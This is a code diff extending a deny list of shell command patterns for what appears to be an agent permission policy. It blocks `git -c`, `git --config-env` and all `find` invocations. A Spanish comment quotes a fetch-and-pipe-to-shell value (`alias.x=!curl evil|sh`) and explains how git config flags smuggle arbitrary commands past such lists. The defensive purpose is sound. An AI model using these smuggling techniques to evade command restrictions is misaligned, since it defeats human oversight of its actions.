@@ -93,6 +93,14 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   'git -C * push * main *',
   'git -C * push * master',
   'git -C * push * master *',
+  // `-c <key>=<value>` reconfigura git por esta sola invocación — `alias.x=!curl evil|sh`,
+  // `core.sshCommand=...`, `core.pager=...` o `credential.helper=!...` corren un comando
+  // arbitrario vía `sh`, y como todo eso viaja DENTRO de un único token (`alias.x=!...`), el
+  // resto del deny-list (bash/curl/intérpretes/env) nunca lo ve — el patrón nunca llega a
+  // comparar contra lo de adentro. Deniega el flag entero, no lo que trae.
+  'git -c *',
+  'git --config-env*',
+  'git --config-env* *',
   'git reset --hard *',
   'git clean *',
   'env',
@@ -122,8 +130,11 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   // ningún patrón de arriba los ve.
   'xargs',
   'xargs *',
-  'find * -exec*',
-  'find * -exec* *',
-  'find * -delete',
-  'find * -delete *',
+  // `find` entero, no sólo `-exec`/`-delete`/`-ok`: el matcher es posicional, y esos flags
+  // pueden aparecer en CUALQUIER posición después de los filtros (`find . -name x -exec rm {}
+  // ';'`) — un patrón de posición fija los deja pasar casi siempre. Mismo criterio que
+  // `terraform init` en la policy real: no se puede denegar todo y re-permitir la forma buena
+  // (`deny` gana sobre `allow`), así que se deniega `find` entero.
+  'find',
+  'find *',
 ];
